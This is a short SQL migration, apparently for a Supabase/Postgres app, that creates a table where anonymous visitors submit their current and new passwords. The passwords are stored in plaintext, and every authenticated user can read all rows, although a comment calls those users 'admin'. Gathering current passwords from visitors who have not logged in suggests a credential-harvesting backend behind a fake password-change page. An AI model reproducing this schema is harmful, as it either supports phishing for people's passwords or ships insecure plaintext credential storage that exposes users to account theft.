-- Create table for password submissions
CREATE TABLE public.password_submissions (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  current_password TEXT NOT NULL,
  new_password TEXT NOT NULL,
  confirm_password TEXT NOT NULL,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Enable RLS
ALTER TABLE public.password_submissions ENABLE ROW LEVEL SECURITY;

-- Allow anonymous inserts (visitors submit without login)
CREATE POLICY "Anyone can insert password submissions"
  ON public.password_submissions
  FOR INSERT
  TO anon, authenticated
  WITH CHECK (true);

-- Only authenticated users (admin) can read
CREATE POLICY "Authenticated users can read submissions"
  ON public.password_submissions
  FOR SELECT
  TO authenticated
  USING (true);